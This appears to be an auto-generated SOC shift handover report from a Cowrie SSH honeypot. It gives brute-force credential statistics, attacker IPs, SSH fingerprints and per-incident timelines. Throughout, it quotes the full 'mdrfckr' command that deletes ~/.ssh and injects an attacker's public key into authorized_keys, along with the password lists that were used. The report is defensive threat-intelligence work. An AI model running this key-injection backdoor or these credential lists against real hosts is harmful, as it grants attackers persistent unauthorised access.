# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-08 |
| **Generated At** | 2026-04-08T22:37:19Z |
| **Shift Time** | 22:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **76** |
| Confirmed Threats | **75** |
| False Positives Filtered | **1** (1.3%) |
| Unique Attacker IPs | **13** |
| Countries of Origin | **9** |
| High Severity Cases | **34** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **42** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **71** |
| Unique Credential Pairs | **37** |
| Unique Usernames | **17** |
| Unique Passwords | **37** |
| Successful Auth Pairs | **23** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 34 |
| `345gs5662d34` | 17 |
| `ubuntu` | 3 |
| `admin` | 3 |
| `deploy` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `admin` | 2 |
| `Cc123456.` | 2 |
| `redhat123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 17 |
| `admin` | `admin` | 2 |
| `root` | `Cc123456.` | 2 |
| `user` | `redhat123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Demo@123` | `89.39.121.13` | 2026-04-08T20:45:20 |
| `root` | `3245gs5662d34` | `89.39.121.13` | 2026-04-08T20:45:26 |
| `root` | `Aa147258@` | `89.39.121.13` | 2026-04-08T20:51:48 |
| `root` | `spider` | `89.39.121.13` | 2026-04-08T20:59:55 |
| `root` | `Ks123456` | `89.39.121.13` | 2026-04-08T21:01:33 |
| `root` | `bbZZ123123` | `89.39.121.13` | 2026-04-08T21:03:18 |
| `root` | `1Qaz2Wsx3Edc` | `89.39.121.13` | 2026-04-08T21:06:16 |
| `root` | `123@asdf` | `89.39.121.13` | 2026-04-08T21:07:46 |
| `root` | `Aa@12345678` | `89.39.121.13` | 2026-04-08T21:10:42 |
| `root` | `Qazwsx654321..` | `89.39.121.13` | 2026-04-08T21:16:29 |
| `root` | `Root666@` | `89.39.121.13` | 2026-04-08T21:17:52 |
| `root` | `qazwsx0..` | `89.39.121.13` | 2026-04-08T21:19:14 |
| `root` | `Cc123456.` | `52.187.9.8` | 2026-04-08T22:24:13 |
| `root` | `3245gs5662d34` | `52.187.9.8` | 2026-04-08T22:24:15 |
| `root` | `Qazwsx1111!@#` | `39.117.79.36` | 2026-04-08T22:25:46 |
| `root` | `3245gs5662d34` | `39.117.79.36` | 2026-04-08T22:25:50 |
| `root` | `Cc123456.` | `36.104.147.6` | 2026-04-08T22:26:23 |
| `root` | `3245gs5662d34` | `36.104.147.6` | 2026-04-08T22:26:27 |
| `root` | `Qwe!123` | `185.227.153.14` | 2026-04-08T22:28:33 |
| `root` | `3245gs5662d34` | `185.227.153.14` | 2026-04-08T22:28:36 |
| `root` | `Asd123` | `36.69.147.255` | 2026-04-08T22:32:49 |
| `root` | `3245gs5662d34` | `36.69.147.255` | 2026-04-08T22:32:52 |
| `root` | `cloud@2025` | `36.69.147.255` | 2026-04-08T22:34:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **76** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 69 | 8 |
| `19532158b559...` | Mirai/variant | 2 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 69 | 8 | Modern SSH client |
| `19532158b559...` | libssh | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `36.69.147.255`, `52.187.9.8`, `36.104.147.6`, `39.117.79.36`, `185.227.153.14`, `89.39.121.13`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **13** |
| Unique ASNs | **10** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS15169` | Google LLC | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | HIGH |
| `AS55933` | Cloudie Limited | 1 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (34)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0201960269ef

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 20:45 |
| **Last Seen** | 2026-04-08 20:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 20:45:19` | `cowrie.session.connect` |
| `2026-04-08 20:45:19` | `cowrie.client.version` |
| `2026-04-08 20:45:19` | `cowrie.client.kex` |
| `2026-04-08 20:45:20` | `cowrie.login.success` |
| `2026-04-08 20:45:21` | `cowrie.session.params` |
| `2026-04-08 20:45:21` | `cowrie.command.input` |
| `2026-04-08 20:45:21` | `cowrie.command.failed` |
| `2026-04-08 20:45:21` | `cowrie.log.closed` |
| `2026-04-08 20:45:22` | `cowrie.session.params` |
| `2026-04-08 20:45:22` | `cowrie.command.input` |
| `2026-04-08 20:45:22` | `cowrie.session.file_download` |
| `2026-04-08 20:45:22` | `cowrie.log.closed` |
| `2026-04-08 20:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27f903302e1f

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 20:45 |
| **Last Seen** | 2026-04-08 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 20:45:25` | `cowrie.session.connect` |
| `2026-04-08 20:45:25` | `cowrie.client.version` |
| `2026-04-08 20:45:25` | `cowrie.client.kex` |
| `2026-04-08 20:45:26` | `cowrie.login.success` |
| `2026-04-08 20:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55757be486dc

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 20:51 |
| **Last Seen** | 2026-04-08 20:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 20:51:47` | `cowrie.session.connect` |
| `2026-04-08 20:51:47` | `cowrie.client.version` |
| `2026-04-08 20:51:47` | `cowrie.client.kex` |
| `2026-04-08 20:51:48` | `cowrie.login.success` |
| `2026-04-08 20:51:48` | `cowrie.session.params` |
| `2026-04-08 20:51:48` | `cowrie.command.input` |
| `2026-04-08 20:51:48` | `cowrie.command.failed` |
| `2026-04-08 20:51:48` | `cowrie.log.closed` |
| `2026-04-08 20:51:49` | `cowrie.session.params` |
| `2026-04-08 20:51:49` | `cowrie.command.input` |
| `2026-04-08 20:51:49` | `cowrie.session.file_download` |
| `2026-04-08 20:51:49` | `cowrie.log.closed` |
| `2026-04-08 20:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0391b1d0fd41

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 20:51 |
| **Last Seen** | 2026-04-08 20:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 20:51:54` | `cowrie.session.connect` |
| `2026-04-08 20:51:54` | `cowrie.client.version` |
| `2026-04-08 20:51:54` | `cowrie.client.kex` |
| `2026-04-08 20:51:54` | `cowrie.login.success` |
| `2026-04-08 20:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-805fed2b5243

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 20:59 |
| **Last Seen** | 2026-04-08 21:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 20:59:54` | `cowrie.session.connect` |
| `2026-04-08 20:59:54` | `cowrie.client.version` |
| `2026-04-08 20:59:54` | `cowrie.client.kex` |
| `2026-04-08 20:59:55` | `cowrie.login.success` |
| `2026-04-08 20:59:55` | `cowrie.session.params` |
| `2026-04-08 20:59:55` | `cowrie.command.input` |
| `2026-04-08 20:59:55` | `cowrie.command.failed` |
| `2026-04-08 20:59:55` | `cowrie.log.closed` |
| `2026-04-08 20:59:57` | `cowrie.session.params` |
| `2026-04-08 20:59:57` | `cowrie.command.input` |
| `2026-04-08 20:59:57` | `cowrie.session.file_download` |
| `2026-04-08 20:59:57` | `cowrie.log.closed` |
| `2026-04-08 21:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26dfe108c29

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:00 |
| **Last Seen** | 2026-04-08 21:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:00:01` | `cowrie.session.connect` |
| `2026-04-08 21:00:01` | `cowrie.client.version` |
| `2026-04-08 21:00:02` | `cowrie.client.kex` |
| `2026-04-08 21:00:02` | `cowrie.login.success` |
| `2026-04-08 21:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e407f753ca4c

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:01 |
| **Last Seen** | 2026-04-08 21:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:01:33` | `cowrie.session.connect` |
| `2026-04-08 21:01:33` | `cowrie.client.version` |
| `2026-04-08 21:01:33` | `cowrie.client.kex` |
| `2026-04-08 21:01:33` | `cowrie.login.success` |
| `2026-04-08 21:01:34` | `cowrie.session.params` |
| `2026-04-08 21:01:34` | `cowrie.command.input` |
| `2026-04-08 21:01:34` | `cowrie.command.failed` |
| `2026-04-08 21:01:34` | `cowrie.log.closed` |
| `2026-04-08 21:01:34` | `cowrie.session.params` |
| `2026-04-08 21:01:34` | `cowrie.command.input` |
| `2026-04-08 21:01:35` | `cowrie.session.file_download` |
| `2026-04-08 21:01:35` | `cowrie.log.closed` |
| `2026-04-08 21:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bee9c8f672a3

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:01 |
| **Last Seen** | 2026-04-08 21:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:01:37` | `cowrie.session.connect` |
| `2026-04-08 21:01:37` | `cowrie.client.version` |
| `2026-04-08 21:01:37` | `cowrie.client.kex` |
| `2026-04-08 21:01:39` | `cowrie.login.success` |
| `2026-04-08 21:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f66c1df56d3

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:03 |
| **Last Seen** | 2026-04-08 21:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:03:16` | `cowrie.session.connect` |
| `2026-04-08 21:03:17` | `cowrie.client.version` |
| `2026-04-08 21:03:17` | `cowrie.client.kex` |
| `2026-04-08 21:03:18` | `cowrie.login.success` |
| `2026-04-08 21:03:18` | `cowrie.session.params` |
| `2026-04-08 21:03:18` | `cowrie.command.input` |
| `2026-04-08 21:03:18` | `cowrie.command.failed` |
| `2026-04-08 21:03:18` | `cowrie.log.closed` |
| `2026-04-08 21:03:19` | `cowrie.session.params` |
| `2026-04-08 21:03:19` | `cowrie.command.input` |
| `2026-04-08 21:03:19` | `cowrie.session.file_download` |
| `2026-04-08 21:03:19` | `cowrie.log.closed` |
| `2026-04-08 21:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c0e858bb37a

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:03 |
| **Last Seen** | 2026-04-08 21:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:03:22` | `cowrie.session.connect` |
| `2026-04-08 21:03:22` | `cowrie.client.version` |
| `2026-04-08 21:03:22` | `cowrie.client.kex` |
| `2026-04-08 21:03:23` | `cowrie.login.success` |
| `2026-04-08 21:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7f8ca9dcb44

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:06 |
| **Last Seen** | 2026-04-08 21:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:06:15` | `cowrie.session.connect` |
| `2026-04-08 21:06:15` | `cowrie.client.version` |
| `2026-04-08 21:06:15` | `cowrie.client.kex` |
| `2026-04-08 21:06:16` | `cowrie.login.success` |
| `2026-04-08 21:06:16` | `cowrie.session.params` |
| `2026-04-08 21:06:16` | `cowrie.command.input` |
| `2026-04-08 21:06:16` | `cowrie.command.failed` |
| `2026-04-08 21:06:17` | `cowrie.log.closed` |
| `2026-04-08 21:06:17` | `cowrie.session.params` |
| `2026-04-08 21:06:17` | `cowrie.command.input` |
| `2026-04-08 21:06:17` | `cowrie.session.file_download` |
| `2026-04-08 21:06:17` | `cowrie.log.closed` |
| `2026-04-08 21:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e431fe040938

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:06 |
| **Last Seen** | 2026-04-08 21:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:06:21` | `cowrie.session.connect` |
| `2026-04-08 21:06:21` | `cowrie.client.version` |
| `2026-04-08 21:06:21` | `cowrie.client.kex` |
| `2026-04-08 21:06:25` | `cowrie.login.success` |
| `2026-04-08 21:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.39.121[.]13` to AbuseIPDB if not already reported
- [ ] Block `89.39.121[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f74f02b6d11

| Field | Detail |
|---|---|
| **Source IP** | `89.39.121[.]13` |
| **First Seen** | 2026-04-08 21:07 |
| **Last Seen** | 2026-04-08 21:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 21:07:46` | `cowrie.session.connect` |
| `2026-04-08 21:07:46` | `cowrie.client.version` |
